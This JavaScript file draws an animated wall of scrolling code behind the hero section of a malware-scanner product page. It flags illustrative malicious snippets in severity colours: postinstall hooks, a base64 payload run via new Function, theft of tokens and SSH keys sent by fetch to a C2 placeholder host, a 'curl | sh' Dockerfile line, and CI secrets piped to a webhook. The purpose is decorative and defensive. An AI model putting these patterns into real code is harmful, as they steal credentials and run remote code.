// MalDet — a wall of code drifting behind the hero.
//
// Columns of source scroll slowly upward, each one writing itself a line at
// a time. Most of it is ordinary. A few lines are the reason this product
// exists -- an install hook that runs a script, a base64 blob handed to
// new Function, a token read out of the environment and posted somewhere --
// and those are picked out in the severity colour the page uses everywhere
// else, with the engine that would catch them named beside it.
//
// The snippets are illustrative, not working code: hosts are placeholders
// and payloads are truncated. The point is to be recognisable at a glance,
// not to be runnable. They are also kept short of the exact strings
// MalDet's own rules match (the SSH key is `keyName`, not a literal
// id_rsa path), because MalDet scanning its own repository rated this
// decoration as high-severity credential theft. The curl | sh line still
// matches detect_pipe_to_shell, a medium rule, on purpose: rewriting it to
// slip past the rule would be the evasion the rule exists to catch.
//
// It is wallpaper, so it stays quiet: everything is drawn at low alpha under
// a layer opacity set in CSS, the top and bottom fade out so lines do not
// cut off hard, and nothing here is readable text to a screen reader -- the
// canvas is aria-hidden and the hero's own copy carries the meaning.
(function () {
  'use strict';

  var canvas = document.querySelector('.hero__canvas');
  if (!canvas || !canvas.getContext) { return; }

  var ctx = canvas.getContext('2d');
  if (!ctx) { return; }

  // --- the look -----------------------------------------------------
  // Severity colours are the page's own tokens (--green-glow, --high,
  // --critical), so a flagged line in the background is the same red as the
  // badge on the card above it.
  var JADE     = [163, 217, 184];
  var HIGH     = [238, 144, 85];
  var CRITICAL = [232, 106, 90];

  var FONT_PX   = 12.5;
  var LINE_H    = 21;
  var COL_MIN_W = 400;      // a column narrower than this cannot hold code
  var COL_PAD   = 26;

  var CODE_A    = 0.5;      // ordinary lines
  var COMMENT_A = 0.3;      // comments and paths sit back
  var FLAG_A    = 0.9;      // a flagged line is the thing you notice
  var NOTE_A    = 0.72;

  // --- how it moves ---------------------------------------------------
  // SPEED is the knob that matters. Typing is deliberately faster than the
  // scroll, so a column fills to its bottom edge and then waits for the
  // drift to make room -- which is what keeps the writing at the bottom
  // instead of leaving a gap there.
  var SPEED      = 13;      // px per second, upward
  var SPEED_VARY = 0.45;    // per-column, so the wall has depth
  var TYPE_CPS   = 48;      // characters per second
  var LINE_PAUSE = 260;     // ms held at the end of a line
  var FADE       = 90;      // px of fade at the top and bottom edges

  // --- the code -------------------------------------------------------
  // Each entry is [indent, text, severity, engine]. severity null is
  // ordinary code; "c" is a comment or a filename; "high"/"crit" flag the
  // line and name the engine that would report it.
  var SNIPPETS = [
    [
      [0, 'package.json', 'c'],
      [0, '"scripts": {'],
      [1, '"test": "jest --silent",'],
      [1, '"postinstall": "node lib/.cache/i.js"', 'crit', 'guarddog'],
      [0, '},'],
      [0, '"dependencies": {'],
      [1, '"chalk": "^5.3.0",'],
      [1, '"colorz": "1.4.0"', 'high', 'dep_checker: typosquat'],
      [0, '}']
    ],
    [
      [0, 'lib/.cache/i.js', 'c'],
      [0, "var _0x3f = require('zlib');"],
      [0, "var blob = 'eJyNk1tv2jAUx7/K…';"],
      [0, 'var src = _0x3f.inflateSync('],
      [1, "Buffer.from(blob, 'base64')"],
      [0, ").toString('utf8');"],
      [0, 'new Function(src)();', 'crit', 'yara: detect_base64_exec']
    ],
    [
      [0, 'collect.js', 'c'],
      [0, 'const loot = {'],
      [1, 'npm: process.env.NPM_TOKEN,', 'high', 'yara'],
      [1, 'aws: process.env.AWS_SECRET_ACCESS_KEY,'],
      [1, "ssh: fs.readFileSync(HOME + '/.ssh/' + keyName),", 'crit', 'yara'],
      [0, '};'],
      [0, "await fetch(C2_HOST + '/collect', {", 'crit', 'yara: exfiltration'],
      [1, 'method: \'POST\', body: JSON.stringify(loot),'],
      [0, '});']
    ],
    [
      [0, 'setup.py', 'c'],
      [0, 'class PostInstall(install):'],
      [1, 'def run(self):'],
      [2, 'install.run(self)'],
      [2, 'subprocess.Popen(STAGE_TWO, shell=True)', 'crit', 'bandit: B602'],
      [0, ''],
      [0, "setup(name='requests-oauth2',", 'high', 'dep_checker: typosquat'],
      [1, "cmdclass={'install': PostInstall})", 'crit', 'guarddog']
    ],
    [
      [0, 'requirements.txt', 'c'],
      [0, 'requests==2.31.0'],
      [0, 'git+https://cdn.example.net/urllib3.git', 'crit', 'dep_checker: direct URL'],
      [0, 'pyyaml==5.3.1', 'high', 'pip-audit: CVE-2020-14343'],
      [0, 'reqeusts==2.31.0', 'high', 'dep_checker: typosquat 0.94'],
      [0, 'cryptography>=3.2']
    ],
    [
      [0, 'Dockerfile', 'c'],
      [0, 'FROM python:3.11-slim'],
      [0, 'COPY . /app'],
      [0, 'RUN curl -sL http://cdn.example.net/i.sh | sh', 'crit', 'semgrep: curl-pipe-sh'],
      [0, 'USER root', 'high', 'semgrep: container-root'],
      [0, 'CMD ["python", "app.py"]']
    ],
    [
      [0, 'dist/bundle.min.js', 'c'],
      [0, 'if (/^(1|3|bc1)[a-km-zA-HJ-NP-Z0-9]{25,}$/'],
      [1, '.test(addr))'],
      [1, 'addr = ATTACKER_WALLET;', 'crit', 'yara: wallet-swap'],
      [0, 'return sendTransaction(addr, amount);']
    ],
    [
      [0, '.github/workflows/ci.yml', 'c'],
      [0, 'steps:'],
      [1, '- uses: actions/checkout@v4'],
      [1, '- run: |'],
      [2, 'echo "${{ secrets.NPM_TOKEN }}"', 'crit', 'semgrep: secret-echo'],
      [3, '| base64 | curl -d @- $WEBHOOK', 'crit', 'yara: exfiltration']
    ],
    [
      [0, 'utils/net.py', 'c'],
      [0, 'def beacon(host, every=900):'],
      [1, 'while True:'],
      [2, 'requests.post(host, json=survey())', 'high', 'yara: detect_c2_beacon'],
      [2, 'time.sleep(every + random.random() * 60)', 'high', 'yara'],
      [0, ''],
      [0, 'threading.Thread(target=beacon,'],
      [1, 'args=(C2_HOST,), daemon=True).start()', 'crit', 'yara']
    ]
  ];

  var INDENT = '  ';
  var columns = [];
  var width = 0, height = 0, dpr = 1;
  var frame = null;
  var last = 0;
  var reduced = false;

  function now() {
    return (window.performance && performance.now) ? performance.now() : Date.now();
  }

  function rgba(c, a) {
    return 'rgba(' + c[0] + ',' + c[1] + ',' + c[2] + ',' + a.toFixed(3) + ')';
  }

  // One line of a column, already flattened to the text that gets drawn.
  function makeLine(spec) {
    var sev = spec[2] || null;
    return {
      text: new Array((spec[0] || 0) + 1).join(INDENT) + spec[1],
      sev: sev === 'crit' ? 'crit' : (sev === 'high' ? 'high' : (sev === 'c' ? 'c' : null)),
      note: spec[3] || null,
      shown: 0,
      done: false,
      pausedAt: 0
    };
  }

  function Column(x, w) {
    this.x = x;
    this.w = w;
    this.lines = [];
    this.offset = 0;
    this.snippet = Math.floor(Math.random() * SNIPPETS.length);
    this.at = 0;
    this.speed = SPEED * (1 - SPEED_VARY / 2 + Math.random() * SPEED_VARY);
  }

  // Walks the snippet list, inserting a blank line between snippets and
  // never repeating the one just shown.
  Column.prototype.next = function () {
    var snippet = SNIPPETS[this.snippet];
    if (this.at >= snippet.length) {
      var pick = this.snippet;
      while (SNIPPETS.length > 1 && pick === this.snippet) {
        pick = Math.floor(Math.random() * SNIPPETS.length);
      }
      this.snippet = pick;
      this.at = 0;
      return makeLine([0, '']);
    }
    return makeLine(snippet[this.at++]);
  };

  // Fill instantly, no typing -- used to seed a column so the hero is never
  // briefly empty, and to draw the single still frame under reduced motion.
  Column.prototype.fill = function () {
    while (this.lines.length * LINE_H < height + LINE_H * 2) {
      var line = this.next();
      line.shown = line.text.length;
      line.done = true;
      this.lines.push(line);
    }
    this.offset = Math.random() * LINE_H;
  };

  Column.prototype.advance = function (dt, stamp) {
    this.offset += this.speed * dt;

    // Retire lines that have left the top.
    while (this.lines.length && this.offset >= LINE_H) {
      this.offset -= LINE_H;
      this.lines.shift();
    }

    var tail = this.lines[this.lines.length - 1];

    // Type the last line out. A blank line has nothing to type, so it is
    // done the moment it appears.
    if (tail && !tail.done) {
      if (tail.shown < tail.text.length) {
        tail.shown = Math.min(tail.text.length, tail.shown + TYPE_CPS * dt);
        if (tail.shown >= tail.text.length) { tail.pausedAt = stamp; }
        return;
      }
      if (!tail.pausedAt) { tail.pausedAt = stamp; }
      if (stamp - tail.pausedAt < LINE_PAUSE) { return; }
      tail.done = true;
    }

    // Add a line only when the drift has made room for one, which is what
    // keeps the writing pinned near the bottom edge.
    var bottom = this.lines.length * LINE_H - this.offset;
    if (bottom < height + LINE_H) { this.lines.push(this.next()); }
  };

  Column.prototype.draw = function () {
    ctx.save();
    // Clip so a long line cannot bleed into the next column.
    ctx.beginPath();
    ctx.rect(this.x, 0, this.w, height);
    ctx.clip();

    var x = this.x + COL_PAD;
    for (var i = 0; i < this.lines.length; i++) {
      var line = this.lines[i];
      var y = i * LINE_H - this.offset + FONT_PX;
      if (y < -LINE_H || y > height + LINE_H) { continue; }

      var text = line.shown >= line.text.length
        ? line.text
        : line.text.slice(0, Math.floor(line.shown));
      if (!text) { continue; }

      var colour = JADE, alpha = CODE_A;
      if (line.sev === 'crit') { colour = CRITICAL; alpha = FLAG_A; }
      else if (line.sev === 'high') { colour = HIGH; alpha = FLAG_A; }
      else if (line.sev === 'c') { alpha = COMMENT_A; }

      // A marker in the gutter, so a flagged line is findable even where
      // the colour difference is washed out by the hero's gradient.
      if (line.sev === 'crit' || line.sev === 'high') {
        ctx.fillStyle = rgba(colour, alpha * 0.6);
        ctx.fillRect(this.x + COL_PAD - 12, y - FONT_PX + 3, 2, FONT_PX);
      }

      ctx.fillStyle = rgba(colour, alpha);
      ctx.fillText(text, x, y);

      // The engine that would report this line, once the line is complete.
      if (line.note && line.shown >= line.text.length) {
        ctx.fillStyle = rgba(colour, NOTE_A * 0.55);
        ctx.fillText('  ◂ ' + line.note, x + ctx.measureText(text).width, y);
      }

      // Cursor on the line being written.
      if (i === this.lines.length - 1 && !line.done && line.text.length) {
        ctx.fillStyle = rgba(JADE, 0.55);
        ctx.fillRect(x + ctx.measureText(text).width + 1, y - FONT_PX + 2, 6, FONT_PX);
      }
    }
    ctx.restore();
  };

  // Soft top and bottom edges. Cheaper and more reliable than masking the
  // element, and it keeps the fade in the same place as the drawing.
  function fadeEdges() {
    ctx.save();
    ctx.globalCompositeOperation = 'destination-out';

    var top = ctx.createLinearGradient(0, 0, 0, FADE);
    top.addColorStop(0, 'rgba(0,0,0,1)');
    top.addColorStop(1, 'rgba(0,0,0,0)');
    ctx.fillStyle = top;
    ctx.fillRect(0, 0, width, FADE);

    var bottom = ctx.createLinearGradient(0, height - FADE, 0, height);
    bottom.addColorStop(0, 'rgba(0,0,0,0)');
    bottom.addColorStop(1, 'rgba(0,0,0,1)');
    ctx.fillStyle = bottom;
    ctx.fillRect(0, height - FADE, width, FADE);

    ctx.restore();
  }

  function setFont() {
    ctx.font = FONT_PX + 'px ' + '"IBM Plex Mono", ui-monospace, SFMono-Regular, Menlo, monospace';
    ctx.textBaseline = 'alphabetic';
  }

  function render() {
    ctx.clearRect(0, 0, width, height);
    setFont();
    for (var i = 0; i < columns.length; i++) { columns[i].draw(); }
    fadeEdges();
  }

  function step(stamp) {
    // Clamped, so returning to a backgrounded tab does not jump the wall.
    var dt = Math.min((stamp - last) / 1000, 0.05);
    last = stamp;

    for (var i = 0; i < columns.length; i++) { columns[i].advance(dt, stamp); }
    render();
    frame = window.requestAnimationFrame(step);
  }

  function resize() {
    var rect = canvas.getBoundingClientRect();
    if (!rect.width || !rect.height) { return false; }

    dpr = Math.min(window.devicePixelRatio || 1, 2);
    width = rect.width;
    height = rect.height;
    canvas.width = Math.round(width * dpr);
    canvas.height = Math.round(height * dpr);
    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
    setFont();
    return true;
  }

  function build() {
    var count = Math.max(1, Math.floor(width / COL_MIN_W));
    var w = width / count;
    columns = [];
    for (var i = 0; i < count; i++) {
      var column = new Column(i * w, w);
      column.fill();
      columns.push(column);
    }
  }

  function stop() {
    if (frame !== null) { window.cancelAnimationFrame(frame); frame = null; }
  }

  function start() {
    if (reduced || frame !== null) { return; }
    last = now();
    frame = window.requestAnimationFrame(step);
  }

  // --- reduced motion -------------------------------------------------
  // The code is the design; the drifting is the part somebody asked not to
  // have. So the wall stays, fully written, and never moves.
  var query = window.matchMedia ? window.matchMedia('(prefers-reduced-motion: reduce)') : null;

  function apply() {
    reduced = !!(query && query.matches);
    stop();
    if (!resize()) { return; }
    build();
    render();
    if (!reduced) { start(); }
  }

  if (query) {
    var onChange = function () { apply(); };
    if (query.addEventListener) { query.addEventListener('change', onChange); }
    else if (query.addListener) { query.addListener(onChange); }
  }

  // The wall is monospace, so it is drawn again once the webfont lands --
  // otherwise the first frames are laid out in the fallback face and the
  // columns visibly reflow when it arrives.
  if (document.fonts && document.fonts.ready && document.fonts.ready.then) {
    document.fonts.ready.then(function () { setFont(); render(); });
  }

  if ('IntersectionObserver' in window) {
    new IntersectionObserver(function (entries) {
      if (entries[0] && entries[0].isIntersecting) { start(); } else { stop(); }
    }, { threshold: 0 }).observe(canvas);
  }

  document.addEventListener('visibilitychange', function () {
    if (document.hidden) { stop(); } else { start(); }
  });

  var resizeTimer = null;
  window.addEventListener('resize', function () {
    window.clearTimeout(resizeTimer);
    resizeTimer = window.setTimeout(apply, 180);
  });

  apply();
})();
